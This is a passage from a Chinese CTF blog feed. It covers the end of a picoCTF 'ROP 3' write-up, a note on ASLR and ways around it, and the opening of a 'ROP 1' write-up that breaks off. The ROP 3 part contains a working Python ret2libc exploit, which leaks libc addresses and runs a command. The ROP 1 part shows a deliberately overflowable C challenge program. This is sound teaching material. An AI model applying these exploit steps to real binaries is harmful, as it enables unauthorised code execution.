+&lt;p&gt;我们选择 &lt;code&gt;read&lt;/code&gt; 函数的地址作为基准。首先，我们需要通过溢出覆盖掉返回地址，从而能够调用 &lt;code&gt;write&lt;/code&gt; 函数打印出 &lt;code&gt;read&lt;/code&gt; 函数的真实地址，然后通过构造栈上的内容，让 &lt;code&gt;write&lt;/code&gt; 函数再次返回至 &lt;code&gt;vulnerable_function&lt;/code&gt;，以便我们再次覆盖返回地址调用 &lt;code&gt;system&lt;/code&gt; 函数。&lt;code&gt;system&lt;/code&gt; 函数的地址通过 &lt;code&gt;read&lt;/code&gt; 函数的地址计算而得。&lt;/p&gt;
+&lt;p&gt;首先我们需要计算一下 &lt;code&gt;system&lt;/code&gt; 和 &lt;code&gt;read&lt;/code&gt; 函数之间的偏移。使用 gdb 调试一下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(gdb) info address system
+Symbol &amp;quot;system&amp;quot; is at 0xf7e25200 in a file compiled without debugging.
+(gdb) info address read
+Symbol &amp;quot;read&amp;quot; is at 0xf7ececb0 in a file compiled without debugging.&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;因此 &lt;code&gt;system&lt;/code&gt; 的地址就等于 &lt;code&gt;read + (0xf7e25200 - 0xf7ececb0)&lt;/code&gt;。下面我们有一个问题没有解决：&lt;code&gt;/bin/sh&lt;/code&gt; 字符串要怎么搞？这里有几种不同方法：一是可以使用 gdb 在内存中搜索一下，看看内存中是否会有现成的字符串，有时候某些指令可能会碰巧组合成我们需要的字符串；二是我们可以自行找一块可写的内存把这一段字符串写入——我们有 &lt;code&gt;read&lt;/code&gt; 方法可以从 &lt;code&gt;stdin&lt;/code&gt; 读入字符串，而后写入到指定的地址中。&lt;/p&gt;
+&lt;p&gt;libc 中刚好存在 &lt;code&gt;/bin/sh&lt;/code&gt; ——首先在 gdb 中使用 &lt;code&gt;info proc&lt;/code&gt; 查看一下进程 id，然后通过 &lt;code&gt;cat /proc/PID/maps&lt;/code&gt; 查看一下内存映射情况：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;f7de8000-f7fbd000 r-xp 00000000 08:01 258140                             /lib/i386-linux-gnu/libc-2.27.so
+f7fbd000-f7fbe000 ---p 001d5000 08:01 258140                             /lib/i386-linux-gnu/libc-2.27.so
+f7fbe000-f7fc0000 r--p 001d5000 08:01 258140                             /lib/i386-linux-gnu/libc-2.27.so
+f7fc0000-f7fc1000 rw-p 001d7000 08:01 258140                             /lib/i386-linux-gnu/libc-2.27.so&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后在 gdb 中查找一下 &lt;code&gt;/bin/sh&lt;/code&gt;：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(gdb) find 0xf7de8000,0xf7fbd000,&amp;quot;/bin/sh&amp;quot;
+0xf7f660cf
+1 pattern found.&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;因此，&lt;code&gt;/bin/sh&lt;/code&gt; 的地址即为 &lt;code&gt;read_addr + (0xf7f660cf - 0xf7ececb0)&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;下面我们就要正式开始进行爆破了。由于我们需要两次溢出，第二次溢出填入的内容需要根据第一次溢出的输出而改变，因此我们需要 python 的一点帮助：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; subprocess &lt;span class=&quot;im&quot;&gt;as&lt;/span&gt; sp&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-2&quot; title=&quot;2&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-3&quot; title=&quot;3&quot;&gt;p &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; sp.Popen(&lt;span class=&quot;st&quot;&gt;&amp;quot;./rop3-7f3312fe43c46d26&amp;quot;&lt;/span&gt;, stdin&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;sp.PIPE, stdout&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;sp.PIPE, stderr&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;sp.PIPE, bufsize&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-4&quot; title=&quot;4&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-5&quot; title=&quot;5&quot;&gt;&lt;span class=&quot;co&quot;&gt;#                                               ↓write函数结束后的返回地址              ↓write的第二个参数&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-6&quot; title=&quot;6&quot;&gt;p.stdin.write(&lt;span class=&quot;st&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x88&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;0000&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xa0\x83\x04\x08\x74\x84\x04\x08\x01\x00\x00\x00\x00\xa0\x04\x08\x04\x00\x00\x00\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-7&quot; title=&quot;7&quot;&gt;&lt;span class=&quot;co&quot;&gt;#                          ↑ebp ↑write的地址                      ↑write的第一个参数                ↑write的第三个参数&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-8&quot; title=&quot;8&quot;&gt;s &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; p.stdout.read(&lt;span class=&quot;dv&quot;&gt;4&lt;/span&gt;)[::&lt;span class=&quot;op&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;]&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-9&quot; title=&quot;9&quot;&gt;read_addr &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;int&lt;/span&gt;(s.encode(&lt;span class=&quot;st&quot;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;), &lt;span class=&quot;dv&quot;&gt;16&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-10&quot; title=&quot;10&quot;&gt;system_addr &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; read_addr &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; (&lt;span class=&quot;bn&quot;&gt;0xf7e25200&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0xf7ececb0&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-11&quot; title=&quot;11&quot;&gt;system_s &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;format&lt;/span&gt;(system_addr, &lt;span class=&quot;st&quot;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;).decode(&lt;span class=&quot;st&quot;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;)[::&lt;span class=&quot;op&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;]&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-12&quot; title=&quot;12&quot;&gt;str_addr &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; read_addr &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; (&lt;span class=&quot;bn&quot;&gt;0xf7f660cf&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0xf7ececb0&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-13&quot; title=&quot;13&quot;&gt;str_s &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;format&lt;/span&gt;(str_addr, &lt;span class=&quot;st&quot;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;).decode(&lt;span class=&quot;st&quot;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;)[::&lt;span class=&quot;op&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;]&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-14&quot; title=&quot;14&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-15&quot; title=&quot;15&quot;&gt;&lt;span class=&quot;co&quot;&gt;#                                              ↓system结束后的返回地址&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-16&quot; title=&quot;16&quot;&gt;p.stdin.write(&lt;span class=&quot;st&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x88&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;0000&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; system_s &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;0000&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; str_s &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;*&lt;/span&gt; (&lt;span class=&quot;dv&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;-0x88&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;-16&lt;/span&gt;) &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;whoami&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-17&quot; title=&quot;17&quot;&gt;&lt;span class=&quot;co&quot;&gt;#                          ↑ebp    ↑system的地址        ↑system的参数                   ↑想要执行的命令&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-18&quot; title=&quot;18&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-19&quot; title=&quot;19&quot;&gt;&lt;span class=&quot;co&quot;&gt;# 将会打印出 whoami 的执行结果&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-20&quot; title=&quot;20&quot;&gt;&lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt; p.stdout.readline()&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+&lt;a href='/notes/stack-buffer-overflow-aslr.html'&gt;
+&lt;div class=&quot;alert alert-success&quot;&gt;
+&lt;i class='fas fa-pencil-alt'&gt;&lt;/i&gt; 相关笔记：栈缓冲区溢出之二 ASLR
+&lt;/div&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content><author><name></name></author><category term="pwn" /><summary type="html">这是 ROP 2 的进阶版。程序不再导入 system 函数，也没有现成的 “/bin/sh” 字符串了：</summary></entry><entry><title type="html">栈缓冲区溢出之二 ASLR</title><link href="https://ctf.dontpanic.blog/notes/stack-buffer-overflow-aslr.html" rel="alternate" type="text/html" title="栈缓冲区溢出之二 ASLR" /><published>2019-02-19T00:00:00+00:00</published><updated>2019-02-19T00:00:00+00:00</updated><id>https://ctf.dontpanic.blog/notes/stack-buffer-overflow-aslr</id><content type="html" xml:base="https://ctf.dontpanic.blog/notes/stack-buffer-overflow-aslr.html">&lt;p&gt;&lt;a href=&quot;/notes/stack-buffer-overflow-101.html&quot;&gt;上文&lt;/a&gt;介绍了栈缓冲区溢出的基本情况与利用方法。栈缓冲区溢出之后，如果没有任何防护措施，攻击者可以非常容易地改变程序执行逻辑，甚至可以执行注入的代码。为了降低栈缓冲区溢出漏洞发生后的风险，很多技术应运而生，ASLR（Address Space Layout Randomization，地址空间布局随机化）就是其中之一。&lt;/p&gt;
+&lt;p&gt;由于缓冲区溢出后，攻击者通常需要需要跳转到某些特定的系统函数、或是跳转到堆栈上执行，ASLR 的基本思想就是随机化动态库和堆栈空间的地址。这样就使得每次程序启动时，它们的地址都会发生变化，使得攻击者难以确定需要跳转到的目标地址。&lt;/p&gt;
+&lt;h3 id=&quot;查看系统是否开启-aslr&quot;&gt;查看系统是否开启 ASLR&lt;/h3&gt;
+&lt;h4 id=&quot;windows&quot;&gt;Windows&lt;/h4&gt;
+&lt;p&gt;Windows 自从 Vista 后全面支持了 ASLR 保护。在新版 Windows 10 中，可以在安全中心设置是否开启这一功能：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/local/posts/stack-buffer-overflow-aslr/windows-aslr-settings.jpg&quot; alt=&quot;windows-aslr-settings&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;设置中的 “Mandatory ASLR” 是指，如果一个程序没有使用 &lt;code&gt;/DYNAMICBASE&lt;/code&gt; 选项编译时，是否仍然要随机地址空间。由于兼容性问题存在，这项设置默认关闭。&lt;/p&gt;
+&lt;h4 id=&quot;linux&quot;&gt;Linux&lt;/h4&gt;
+&lt;p&gt;Linux 系统中，我们可以通过 &lt;code&gt;/proc/sys/kernel/randomize_va_space&lt;/code&gt; 来查看或开启/关闭 ASLR：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$ cat /proc/sys/kernel/randomize_va_space&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;ex&quot;&gt;2&lt;/span&gt;&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;2 表示 ASLR 完全开启。设置为 0 时即为关闭。&lt;/p&gt;
+&lt;h3 id=&quot;为程序启用-aslr&quot;&gt;为程序启用 ASLR&lt;/h3&gt;
+&lt;p&gt;由于启用了 ASLR 后，程序的加载位置会随机变化，因此这还需要编译器的支持。GCC 可以通过使用 &lt;code&gt;-pie&lt;/code&gt; 选项（默认开启）来生成位置无关的代码，从而使得程序能够支持 ASLR。使用 &lt;code&gt;-no-pie&lt;/code&gt; 不会生成位置无关代码。这两种方式生成的可执行文件的信息是不同的：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$ gcc -no-pie test.c&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$ file a.out&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-3&quot; title=&quot;3&quot;&gt;&lt;span class=&quot;ex&quot;&gt;a.out&lt;/span&gt;: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), &lt;span class=&quot;ex&quot;&gt;dynamically&lt;/span&gt; linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b6a30608d5278aba091e7f52f2a7fd25e7c745a9, not stripped&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-4&quot; title=&quot;4&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-5&quot; title=&quot;5&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-6&quot; title=&quot;6&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$ gcc -pie test.c&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-7&quot; title=&quot;7&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$ file a.out&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-8&quot; title=&quot;8&quot;&gt;&lt;span class=&quot;ex&quot;&gt;a.out&lt;/span&gt;: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), &lt;span class=&quot;ex&quot;&gt;dynamically&lt;/span&gt; linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75017e995c8e398060095542ea11b2bb1445a965, not stripped&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-9&quot; title=&quot;9&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;在系统启用了 ASLR 时，通过 &lt;code&gt;/proc/PID/maps&lt;/code&gt; 将可以看到，每次执行时程序所需要的动态库和堆栈空间的加载位置都不同。如果程序启用了 &lt;code&gt;-pie&lt;/code&gt;，将会看到可执行文件自身的加载地址也会发生变化。&lt;/p&gt;
+&lt;p&gt;在 Windows 上，MSVC 的编译选项 &lt;code&gt;/DYNAMICBASE&lt;/code&gt; 具有类似的效果。&lt;/p&gt;
+&lt;div class=&quot;alert alert-light border-info&quot; markdown=&quot;1&quot;&gt;
+&lt;h5&gt;&lt;i class=&quot;fas fa-exclamation&quot;&gt;&lt;/i&gt; Notes&lt;/h5&gt;
+&lt;p&gt;新版 GDB 在调试时会默认关闭被调试程序的 ASLR。可以通过命令 &lt;code&gt;set disable-randomization off&lt;/code&gt; 重新启用。&lt;/p&gt;
+&lt;/div&gt;
+&lt;h3 id=&quot;绕过-aslr&quot;&gt;绕过 ASLR&lt;/h3&gt;
+&lt;p&gt;在某些情况下，我们可以绕过 ASLR 的防护。例如，&lt;/p&gt;
+&lt;ol type=&quot;1&quot;&gt;
+&lt;li&gt;如果缓冲区足够大，当希望跳转至缓冲区中执行指令时，可以尝试通过大量填充 &lt;code&gt;NOP&lt;/code&gt; 使得跳转成功的机率增加。&lt;/li&gt;
+&lt;li&gt;某个寄存器中的值刚好指向了我们需要的地址。&lt;/li&gt;
+&lt;li&gt;通过某些方式泄露出动态库的加载地址。
+&lt;div&gt;
+&lt;a href='/writeups/picoctf-2013-rop-3.html'&gt;
+&lt;div class=&quot;alert alert-success&quot;&gt;
+&lt;i class='fas fa-pencil-alt'&gt;&lt;/i&gt; 相关题目：ROP 3
+&lt;/div&gt;
+&lt;/a&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;2016 年的&lt;a href=&quot;http://www.cs.ucr.edu/~nael/pubs/micro16.pdf&quot;&gt;一篇论文&lt;/a&gt;指出，可以利用分支指令通过旁路探测出模块加载的地址。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&quot;内核地址空间随机化&quot;&gt;内核地址空间随机化&lt;/h3&gt;
+&lt;p&gt;内核同样可以开启 ASLR，这项技术在 Linux 中被称作 KASLR。但由于 &lt;a href=&quot;https://www.zhihu.com/question/265012502/answer/288407097&quot;&gt;2018 年 Intel CPU 所暴露出的漏洞&lt;/a&gt;，KASLR 不再安全。目前 KASLR 已被 KPTI（内核页表隔离）所取代。&lt;/p&gt;</content><author><name></name></author><category term="binary" /><summary type="html">上文介绍了栈缓冲区溢出的基本情况与利用方法。栈缓冲区溢出之后，如果没有任何防护措施，攻击者可以非常容易地改变程序执行逻辑，甚至可以执行注入的代码。为了降低栈缓冲区溢出漏洞发生后的风险，很多技术应运而生，ASLR（Address Space Layout Randomization，地址空间布局随机化）就是其中之一。</summary></entry><entry><title type="html">ROP 1</title><link href="https://ctf.dontpanic.blog/writeups/picoctf-2013-rop-1.html" rel="alternate" type="text/html" title="ROP 1" /><published>2019-02-12T00:00:00+00:00</published><updated>2019-02-12T00:00:00+00:00</updated><id>https://ctf.dontpanic.blog/writeups/picoctf-2013-rop-1</id><content type="html" xml:base="https://ctf.dontpanic.blog/writeups/picoctf-2013-rop-1.html">&lt;p&gt;这是一道基本的溢出题，也提供了源码：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#undef _FORTIFY_SOURCE&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-3&quot; title=&quot;3&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-4&quot; title=&quot;4&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-5&quot; title=&quot;5&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-6&quot; title=&quot;6&quot;&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; not_called() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-7&quot; title=&quot;7&quot;&gt;    &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; system(&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-8&quot; title=&quot;8&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-9&quot; title=&quot;9&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-10&quot; title=&quot;10&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; vulnerable_function() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-11&quot; title=&quot;11&quot;&gt;    &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[&lt;span class=&quot;dv&quot;&gt;128&lt;/span&gt;];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-12&quot; title=&quot;12&quot;&gt;    read(STDIN_FILENO, buf, &lt;span class=&quot;dv&quot;&gt;256&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-13&quot; title=&quot;13&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-14&quot; title=&quot;14&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-15&quot; title=&quot;15&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; be_nice_to_people() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-16&quot; title=&quot;16&quot;&gt;    &lt;span class=&quot;co&quot;&gt;// /bin/sh is usually symlinked to bash, which usually drops privs. Make&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-17&quot; title=&quot;17&quot;&gt;    &lt;span class=&quot;co&quot;&gt;// sure we don&amp;#39;t drop privs if we exec bash, (ie if we call system()).&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-18&quot; title=&quot;18&quot;&gt;    gid_t gid = getegid();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-19&quot; title=&quot;19&quot;&gt;    setresgid(gid, gid, gid);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-20&quot; title=&quot;20&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-21&quot; title=&quot;21&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-22&quot; title=&quot;22&quot;&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt;** argv) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-23&quot; title=&quot;23&quot;&gt;    be_nice_to_people();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-24&quot; title=&quot;24&quot;&gt;    vulnerable_function();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-25&quot; title=&quot;25&quot;&gt;    write(STDOUT_FILENO, &lt;span class=&quot;st&quot;&gt;&amp;quot;Hello, World&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;13&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-26&quot; title=&quot;26&quot;&gt;}&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+&lt;div id=&quot;writeup_show_button&quot; style=&quot;cursor: pointer&quot;&gt;
+    &lt;div class=&quot;alert alert-warning&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处显示 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;writeup_hide_button&quot; style=&quot;cursor: pointer&quot; class=&quot;d-none&quot;&gt;
+    &lt;div class=&quot;alert alert-info&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处隐藏 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector(&quot;#writeup_show_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.remove(&quot;d-none&quot;);
+    }
+    parent.querySelector(&quot;#writeup_hide_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.add(&quot;d-none&quot;);
+    }
+})();
+&lt;/script&gt;
+&lt;div id=&quot;writeup&quot; class=&quot;d-none&quot; markdown=&quot;1&quot;&gt;
+&lt;p&gt;看一下 &lt;code&gt;vulnerable_function&lt;/code&gt; 的反汇编代码，&lt;code&gt;buf&lt;/code&gt; 在 &lt;code&gt;$ebp-0x88&lt;/code&gt; 处：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode asm&quot;&gt;&lt;code class=&quot;sourceCode fasm&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-1&quot; title=&quot;1&quot;&gt;/ (fcn) sym.vulnerable_function &lt;span class=&quot;dv&quot;&gt;41&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-2&quot; title=&quot;2&quot;&gt;|   sym.vulnerable_function ()&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;&lt;/a&gt;
